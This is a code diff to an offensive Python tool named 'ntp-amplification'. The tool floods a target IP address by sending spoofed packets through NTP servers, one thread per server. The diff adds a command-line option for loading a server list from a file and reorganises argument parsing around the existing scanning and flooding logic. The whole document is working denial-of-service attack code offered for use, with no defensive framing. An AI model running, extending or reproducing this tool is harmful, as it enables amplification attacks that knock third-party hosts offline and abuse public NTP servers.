@@ -102,8 +102,13 @@ def printHelp():
 ╚═╝  ╚═══╝   ╚═╝   ╚═╝           ╚═╝  ╚═╝╚═╝     ╚═╝╚═╝     ╚══════╝╚═╝╚═╝     ╚═╝╚══════╝╚═╝  ╚═╝
                                                                                                                                                                                                                                                                                                                         
 """
-    usage = "usage: python3 ntp-amplification <target ip>"
-    manual = banner + "\n" + usage
+    options = """
+OPTIONS:\n 
+-h, --help: Show this help message and exit
+-s, --server: Specify ntp server list\n
+"""
+    usage = "USAGE: python3 ntp-amplification [Options] <target ip>"
+    manual = banner + "\n" + usage + "\n" + options
     print(manual)
 
 
@@ -114,29 +119,58 @@ def deny(server: str, target: str):
     send(packet, loop=1, verbose=True)
 
 
-def main():
-    if len(sys.argv) != 2 or not is_ipv4(sys.argv[1]):
+def parse_args():
+    if len(sys.argv) < 2:
         printHelp()
-        return
+        sys.exit(1)
 
-    if os.geteuid() != 0:
-        print("Script must be executed as root")
-        return
+    options = {'-h': "--help", '-s': "--server"}
+    args = {"target_ip": None, "server_list": None}
 
-    config = Config.from_json_file(CONFIG_PATH)
-    scanner = NTPScanner(config)
+    i = 1
+    while i < len(sys.argv):
+        arg = sys.argv[i]
+        if arg in options.keys():
+            if arg == '-h':
+                printHelp()
+                sys.exit(0)
+            if arg == '-s':
+                if i + 1 >= len(sys.argv):
+                    print("Error: server list file is required")
+                    printHelp()
+                    sys.exit(1)
+                args["server_list"] = sys.argv[i + 1]
+        i += 1
 
-    target = sys.argv[1]
+    args["target_ip"] = sys.argv[-1]
+    if args["target_ip"] is None or not is_ipv4(args["target_ip"]):
+        print("Target ip is required and must be a valid ipv4 address")
+        printHelp()
+        sys.exit(1)
+
+    return args
+
+
+def read_servers(server_list: str) -> list:
+    if not os.path.isfile(server_list):
+        print("Error: server list file does not exist")
+        sys.exit(1)
+
+    with open(server_list, 'r') as f:
+        servers = f.read().splitlines()
+        
+    return servers
+
+
+def ntp_amplify(servers: list, target: str):
     threads = []
-
     try:
-        scanner.scan()
-
         print("Starting to flood: " + target + " ...")
         print("Use CTRL+Z to stop attack")
 
-        for server in scanner.servers:
-            thread = threading.Thread(target=deny, args=(server, target))
+        for server in servers:
+            thread = threading.Thread(
+                target=deny, args=(server, target))
             thread.daemon = True
             thread.start()
             threads.append(thread)
@@ -148,6 +182,25 @@ def main():
 
     except KeyboardInterrupt:
         print("Script interrupted [CTRL + Z]... shutting down")
+
+
+def main():
+    if os.geteuid() != 0:
+        print("Script must be executed as root")
+        return
+
+    args = parse_args()
+    servers = []
+
+    if args["server_list"] is not None:
+        servers = read_servers(args["server_list"])
+        ntp_amplify(servers, args["target_ip"])
+        return
+
+    config = Config.from_json_file(CONFIG_PATH)
+    scanner = NTPScanner(config)
+    scanner.scan()
+    ntp_amplify(scanner.servers, args["target_ip"])
 
 
 if __name__ == '__main__':
